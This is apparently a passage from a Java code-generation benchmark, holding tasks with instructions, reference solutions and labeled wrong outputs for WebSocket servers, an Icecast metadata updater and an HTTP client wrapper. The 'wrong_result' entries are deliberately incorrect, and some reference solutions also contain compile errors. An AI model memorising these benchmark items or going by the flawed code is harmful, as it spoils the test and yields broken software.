    "Canonical_solution": "import java.net.URI;\nimport javax.net.ssl.SSLParameters;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n\n    private final String endpointIdentificationAlgorithm;\n    public boolean onSSLError = false;\n    public boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm)\n        throws java.net.URISyntaxException {\n        super(new URI(\"wss://\" + address + ':' + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        this.onOpen = true;\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof javax.net.ssl.SSLHandshakeException) {\n            this.onSSLError = true;\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        super.onSetSSLParameters(sslParameters);\n        if (endpointIdentificationAlgorithm != null) {\n            sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class SSLWebSocketClient extends WebSocketClient {\n    private String endpointIdentificationAlgorithm;\n    private boolean onSSLError;\n    private boolean onOpen;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) {\n        super(new URI(\"wss://\" + address + \":\" + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onSetSSLParameters(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        onOpen = true;\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Handle message\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Handle close\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        onSSLError = ex instanceof SSLException;\n        // Additional error handling can be added here\n    }\n}"
  },
  {
    "Task_id": 47,
    "Instruction": "Task Description: Create a Java class that implements metadata updates for an Icecast broadcast server using HTTP client functionality.\n\nClass Description: The IcecastBroadcastMetadataUpdater class is responsible for sending metadata updates to an Icecast server via HTTP requests. It constructs the appropriate URL, handles authentication, and manages the HTTP communication asynchronously. The class implements the IBroadcastMetadataUpdater interface and handles character encoding, error logging, and connection status tracking.\n\nAttributes:\n- mLog: Logger - Logger instance for error and status logging\n- mHttpClient: HttpClient - HTTP client instance for making requests\n- mIcecastConfiguration: IcecastConfiguration - Configuration object containing server details (host, port, mount point, credentials)\n- mConnectionLoggingSuppressed: boolean - Flag to prevent duplicate connection error logs\n\nMethods:\n- IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) -> void - Constructor that initializes the class with Icecast server configuration\n- update(IdentifierCollection identifierCollection) -> void - Main method that constructs and sends the metadata update request to the Icecast server. Takes an IdentifierCollection containing metadata information as input. Handles URL construction, encoding, and asynchronous request execution.",
    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.IBroadcastMetadataUpdater;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastConfiguration;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastMetadata;\nimport io.github.dsheirer.identifier.IdentifierCollection;\nimport io.github.dsheirer.properties.SystemProperties;\nimport io.github.dsheirer.util.ThreadPool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URI;\nimport java.net.URLEncoder;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater\n{\n    private final static Logger mLog = LoggerFactory.getLogger(IcecastBroadcastMetadataUpdater.class);\n    private final static String UTF8 = \"UTF-8\";\n    private HttpClient mHttpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();\n    private IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed = false;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration)\n    {\n        mIcecastConfiguration = icecastConfiguration;\n    }\n\n    public void update(IdentifierCollection identifierCollection)\n    {\n        if(mIcecastConfiguration.hasInline())\n        {\n            return;\n        }\n\n        StringBuilder sb = new StringBuilder();\n\n        try\n        {\n            sb.append(\"http://\");\n            sb.append(mIcecastConfiguration.getHost());\n            sb.append(\":\");\n            sb.append(mIcecastConfiguration.getPort());\n            sb.append(\"/admin/metadata?mode=updinfo&mount=\");\n            sb.append(URLEncoder.encode(mIcecastConfiguration.getMountPoint(), UTF8));\n            sb.append(\"&charset=UTF%2d8\");\n            sb.append(\"&song=\").append(URLEncoder.encode(IcecastMetadata.getTitle(identifierCollection), UTF8));\n        }\n        catch(UnsupportedEncodingException uee)\n        {\n            mLog.error(\"Error encoding metadata information to UTF-8\", uee);\n            sb = null;\n        }\n\n        if(sb != null)\n        {\n            final String metadataUpdateURL = sb.toString();\n            URI uri = URI.create(metadataUpdateURL);\n\n            ThreadPool.CACHED.submit(new Runnable()\n            {\n                @Override\n                public void run()\n                {\n                    try\n                    {\n                        HttpRequest request = HttpRequest.newBuilder()\n                            .uri(uri)\n                            .header(\"Authorization\", mIcecastConfiguration.getBase64EncodedCredentials())\n                            .header(\"User-Agent\", SystemProperties.getInstance().getApplicationName())\n                            .GET()\n                            .build();\n\n                        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n                        if(response != null)\n                        {\n                            if(response.statusCode() == 200)\n                            {\n                                mConnectionLoggingSuppressed = false;\n                            }\n                            else if(!mConnectionLoggingSuppressed)\n                            {\n                                mLog.info(\"Error submitting Icecast 2 Metadata update to URL [\" + metadataUpdateURL +\n                                    \"] HTTP Response Code [\" + response.statusCode() + \"] Body [\" + response.body() + \"]\");\n                                mConnectionLoggingSuppressed = true;\n                            }\n                        }\n                    }\n                    catch(IOException | InterruptedException e)\n                    {\n                        mLog.error(\"Error submitting Icecast metadata update\", e);\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "import org.apache.http.client.methods.HttpPost;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.impl.client.HttpClients;\nimport org.apache.http.entity.StringEntity;\nimport org.apache.http.auth.AuthScope;\nimport org.apache.http.auth.UsernamePasswordCredentials;\nimport org.apache.http.client.CredentialsProvider;\nimport org.apache.http.concurrent.FutureCallback;\nimport org.apache.http.HttpResponse;\nimport java.util.logging.Logger;\n\npublic class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater {\n    private final Logger mLog;\n    private final CloseableHttpClient mHttpClient;\n    private final IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) {\n        mIcecastConfiguration = icecastConfiguration;\n        mLog = Logger.getLogger(IcecastBroadcastMetadataUpdater.class.getName());\n        mConnectionLoggingSuppressed = false;\n\n        CredentialsProvider cp = new BasicCredentialsProvider();\n        UsernamePasswordCredentials cred = new UsernamePasswordCredentials(\n            mIcecastConfiguration.getUsername(),\n            mIcecastConfiguration.getPassword()\n        );\n        cp.setCredentials(AuthScope.ANY, cred);\n        mHttpClient = HttpClients.custom()\n            .setDefaultCredentialsProvider(cp)\n            .build();\n    }\n\n    public void update(IdentifierCollection identifierCollection) {\n        try {\n            String host = mIcecastConfiguration.getHost();\n            int port = mIcecastConfiguration.getPort();\n            String mountPoint = mIcecastConfiguration.getMountPoint();\n            String url = \"http://\" + host + \":\" + port + \"/\" + mountPoint;\n\n            HttpPost post = new HttpPost(url);\n            post.setHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            String metadata = encodeMetadata(identifierCollection);\n            StringEntity entity = new StringEntity(metadata, \"UTF-8\");\n            post.setEntity(entity);\n\n            mHttpClient.execute(post, new FutureCallback<HttpResponse>() {\n                @Override\n                public void completed(HttpResponse result) {\n                    mLog.info(\"Metadata update successful for \" + mountPoint);\n                }\n\n                @Override\n                public void failed(Exception exception) {\n                    if (!mConnectionLoggingSuppressed) {\n                        mLog.severe(\"Failed to update metadata for \" + mountPoint + \": \" + exception.getMessage());\n                        mConnectionLoggingSuppressed = true;\n                    }\n                }\n\n                @Override\n                public void cancelled() {\n                    mLog.warning(\"Metadata update request cancelled for \" + mountPoint);\n                }\n            });\n        } catch (Exception e) {\n            mLog.severe(\"Error constructing metadata update request: \" + e.getMessage());\n        }\n    }\n\n    private String encodeMetadata(IdentifierCollection collection) {\n        return collection.getMetadata();\n    }\n}"
  },
  {
    "Task_id": 472,
    "Instruction": "Task Description: Implement a WebSocket server using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing client connections and communication.\n\nAttributes:\n- countServerLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes.\n\nMethods:\n- MyWebSocketServer(int port, CountDownLatch serverDownLatch) -> None - Constructor that initializes the WebSocket server with the specified port and CountDownLatch.\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Called when a new client connection is established.\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Called when a client connection is closed.\n- onMessage(WebSocket conn, String message) -> None - Called when a message is received from a client.\n- onError(WebSocket conn, Exception ex) -> None - Called when an error occurs.\n- onStart() -> None - Called when the server starts successfully.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup complete\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    private final CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(port);\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"Client connected: \" + conn);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Client disconnected: \" + conn + \", code: \" + code + \", reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message: \" + message);\n        conn.send(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n        System.out.println(\"Error occurred: \" + ex.getMessage());\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started on port \" + getPort());\n        countServerLatch.countDown();\n    }\n}"
  },
  {
    "Task_id": 477,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle real-time bidirectional communication between clients and the server.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections, message processing, disconnections, and error scenarios in a WebSocket communication environment.\n\nAttributes:\nNone explicitly declared in this implementation (inherits attributes from WebSocketServer parent class)\n\nMethods:\n1. onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects to the server\n   - conn: WebSocket - The client connection object\n   - handshake: ClientHandshake - The handshake data from the client\n\n2. onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects from the server\n   - conn: WebSocket - The client connection object\n   - code: int - The status code for disconnection\n   - reason: String - The reason for disconnection\n   - remote: boolean - Whether the disconnection was initiated by the remote host\n\n3. onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n   - conn: WebSocket - The client connection object\n   - message: String - The received message content\n\n4. onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n   - conn: WebSocket - The client connection object (may be null if error isn't associated with a specific connection)\n   - ex: Exception - The exception that occurred\n\n5. onStart() -> void - Called when the server starts successfully\n\n6. LocalWebSocketFactory (nested class) - Implements WebSocketServerFactory for custom WebSocket creation\n   Methods:\n   a. createWebSocket(WebSocketAdapter a, Draft d) -> WebSocketImpl\n   b. createWebSocket(WebSocketAdapter a, List<Draft> drafts) -> WebSocketImpl\n   c. wrapChannel(SocketChannel channel, SelectionKey key) -> ByteChannel\n   d. close() -> void",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.ByteChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.WebSocketAdapter;\nimport org.java_websocket.WebSocketImpl;\nimport org.java_websocket.WebSocketServerFactory;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup logic\n    }\n}\n\nprivate class LocalWebSocketFactory implements WebSocketServerFactory {\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, Draft d) {\n        return null;\n    }\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n        return null;\n    }\n\n    @Override\n    public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) throws IOException {\n        return null;\n    }\n\n    @Override\n    public void close() {\n        // Cleanup resources\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    public MyWebSocketServer(int port) {\n        super(port);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"Client connected: \" + conn.getRemoteAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Client disconnected: \" + (remote ? \"remote\" : \"local\") + \" - \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message: \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n        if (conn != null) {\n            conn.close();\n        }\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started\");\n    }\n\n    static class LocalWebSocketFactory implements WebSocketServerFactory {\n        @Override\n        public WebSocketImpl createWebSocket(WebSocketAdapter a, Draft d) {\n            return new WebSocketImpl(a, d);\n        }\n\n        @Override\n        public WebSocketImpl createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n            return new WebSocketImpl(a, drafts);\n        }\n\n        @Override\n        public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) {\n            return channel;\n        }\n\n        @Override\n        public void close() {\n            // Implementation for closing the factory\n        }\n    }\n}"
  },
  {
    "Task_id": 478,
    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should also track SSL support and session information for testing purposes.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It manages client connections, processes incoming messages, handles disconnections, and tracks SSL-related information for testing. The server notifies when it starts successfully via a CountDownLatch.\n\nAttributes:\n- testResult: [TestResult] - Stores test-related information including SSL support status and SSL session\n- countServerDownLatch: [CountDownLatch] - Used to signal when the server has successfully started\n\nMethods:\n- MyWebSocketServer([int port, TestResult testResult, CountDownLatch countServerDownLatch]) -> [void] - Constructor that initializes the server with specified port, test result object, and countdown latch\n- onOpen([WebSocket conn, ClientHandshake handshake]) -> [void] - Called when a new client connects; checks for SSL support and stores SSL session\n- onClose([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Called when a client disconnects\n- onMessage([WebSocket conn, String message]) -> [void] - Called when a message is received from a client\n- onError([WebSocket conn, Exception ex]) -> [void] - Called when an error occurs; prints stack trace\n- onStart() -> [void] - Called when the server starts successfully; decrements the countdown latch",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport javax.net.ssl.SSLSession;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final TestResult testResult;\n    private final CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) {\n        super(new InetSocketAddress(port));\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        testResult.hasSSLSupport = conn.hasSSLSupport();\n        try {\n            testResult.sslSession = conn.getSSLSession();\n        } catch (IllegalArgumentException e) {\n            // Ignore\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    private TestResult testResult;\n    private CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) {\n        super(new ServerConfiguration(port));\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        boolean isSSL = handshake.isSecure();\n        testResult.setSSLSupport(isSSL);\n        if (isSSL) {\n            testResult.setSSLSession(handshake.getSSLSession());\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}"
  },
  {
    "Task_id": 479,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library that handles client connections, messages, and disconnections, with configurable connection limits and support for different WebSocket drafts.\n\nClass Description: AutobahnServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), tracks connection statistics, and supports graceful shutdown when reaching a configured connection limit.\n\nAttributes:\n- openCounter: [static int] - Tracks total number of opened connections\n- closeCounter: [static int] - Tracks total number of closed connections\n- limit: [int] - Maximum number of connections before server shutdown\n\nMethods:\n- Constructor: [AutobahnServerTest]([int port, int limit, Draft d]) -> [void] - Creates server instance with specified port, connection limit, and WebSocket draft\n- Constructor: [AutobahnServerTest]([InetSocketAddress address, Draft d]) -> [void] - Creates server instance with specified address and WebSocket draft\n- onOpen: [void]([WebSocket conn, ClientHandshake handshake]) -> [void] - Handles new client connections, increments openCounter\n- onClose: [void]([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Handles client disconnections, increments closeCounter, shuts down server if limit reached\n- onError: [void]([WebSocket conn, Exception ex]) -> [void] - Handles connection errors, prints stack trace\n- onStart: [void]() -> [void] - Called when server starts, prints startup message\n- onMessage: [void]([WebSocket conn, String message]) -> [void] - Handles text messages, echoes back to client\n- onMessage: [void]([WebSocket conn, ByteBuffer blob]) -> [void] - Handles binary messages, echoes back to client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n\n    private static int openCounter = 0;\n    private static int closeCounter = 0;\n    private int limit = Integer.MAX_VALUE;\n\n    public AutobahnServerTest(int port, int limit, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"///////////Opened connection number\" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"closed\");\n        if (closeCounter >= limit) {\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class AutobahnServerTest extends WebSocketServer {\n    public static int openCounter = 0;\n    public static int closeCounter = 0;\n    private int limit;\n\n    public AutobahnServerTest(int port, int limit, Draft d) {\n        super(port, d);\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n        this.limit = 100;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        if (openCounter == limit) {\n            shutdown();\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started on port \" + getPort());\n    }\n\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using Java's HttpClient for synchronous and asynchronous HTTP operations including GET, PUT, HEAD, and DELETE requests.\n\nClass Description: The BlobHttpClient class provides a wrapper around Java's HttpClient to perform common HTTP operations. It handles client initialization, request construction, and response processing with both synchronous and asynchronous options.\n\nAttributes:\nhttpClient: [HttpClient] - The underlying HTTP client instance used for all requests\n\nMethods:\nsetup(): [void] - Initializes the HttpClient instance with default configuration (follows normal redirects)\ncloseClient(): [void] - Closes the HttpClient instance and releases resources\nput: [HttpResponse<String>]([URI uri, String body]) -> [HttpResponse<String>] - Sends a synchronous PUT request with the provided body to the specified URI and returns the string response\nget: [HttpResponse<String>]([URI uri]) -> [HttpResponse<String>] - Sends a synchronous GET request to the specified URI and returns the string response\ngetAsync: [CompletableFuture<HttpResponse<String>>]([URI uri]) -> [CompletableFuture<HttpResponse<String>>] - Sends an asynchronous GET request to the specified URI and returns a CompletableFuture of the response\nhead: [HttpResponse<Void>]([URI uri]) -> [HttpResponse<Void>] - Sends a synchronous HEAD request to the specified URI and returns a response without body\ndelete: [HttpResponse<Void>]([URI uri]) -> [HttpResponse<Void>] - Sends a synchronous DELETE request to the specified URI and returns a response without body",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutionException;\n\npublic class BlobHttpClient {\n\n    protected HttpClient httpClient;\n\n    public void setup() throws ExecutionException, InterruptedException {\n        httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .build();\n    }\n\n    public void closeClient() throws Exception {\n        httpClient.close();\n    }\n\n    protected HttpResponse<String> put(URI uri, String body) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .PUT(BodyPublishers.ofString(body))\n            .build();\n        HttpResponse<String> response = httpClient.send(request, BodyHandlers.ofString());\n        return response;\n    }\n\n    protected HttpResponse<String> get(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    protected CompletableFuture<HttpResponse<String>> getAsync(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.sendAsync(request, BodyHandlers.ofString());\n    }\n\n    protected HttpResponse<Void> head(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri).HEAD().build();\n        return httpClient.send(request, BodyHandlers.discarding());\n    }\n\n    protected HttpResponse<Void> delete(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri).DELETE().build();\n        return httpClient.send(request, BodyHandlers.discarding());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class BlobHttpClient {\n    private final HttpClient httpClient;\n\n    public BlobHttpClient() {\n        this.httpClient = HttpClient.newHttpClient();\n    }\n\n    public void setup() {\n        // Initializes HttpClient with default configuration (follows redirects)\n    }\n\n    public void closeClient() {\n        // Closes the HttpClient and releases resources\n    }\n\n    public HttpResponse<String> put(URI uri, String body) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .PUT(HttpRequest.BodyPublishers.ofString(body))\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> get(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .GET()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public CompletableFuture<HttpResponse<String>> getAsync(URI uri) {\n        return httpClient.sendAsync(\n                HttpRequest.newBuilder(uri)\n                        .GET()\n                        .build(),\n                HttpResponse.BodyHandlers.ofString()\n        );\n    }\n\n    public HttpResponse<Void> head(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .GET()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.discarding());\n    }\n\n    public HttpResponse<Void> delete(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .DELETE()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.discarding());\n    }\n}"
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles real-time client communication, including connection management, message processing, and error handling.\n\nClass Description: WebSocketServer is a Java EE WebSocket endpoint that manages client connections through WebSocket protocol. It handles connection events (open/close/error) and processes incoming messages, supporting different message operations like sending messages, reading status, and retrieving history.\n\nAttributes:\n- sessionPools: [ConcurrentHashMap<String, Session>] - Thread-safe map storing active client sessions with their IDs as keys\n\nMethods:\n- onOpen: [onOpen(String accessToken, Session session)] -> [void] - Handles new WebSocket connections, authenticates users, and manages session conflicts\n- onClose: [onClose(String accessToken)] -> [void] - Cleans up closed connections from session pool\n- onMessage: [onMessage(String accessToken, String msg)] -> [void] - Processes incoming JSON messages and delegates to appropriate operations\n- operation: [operation(String accessToken, MessageOperation messageOperation)] -> [void] - Executes different message operations based on operation type\n- sendMessage: [sendMessage(String sessionId, MessageVO message)] -> [void] - Sends message to specific client session by ID\n- sendMessage: [sendMessage(Session session, MessageVO message)] -> [void] - Sends message to given session object\n- onError: [onError(Session session, Throwable throwable)] -> [void] - Handles WebSocket communication errors",
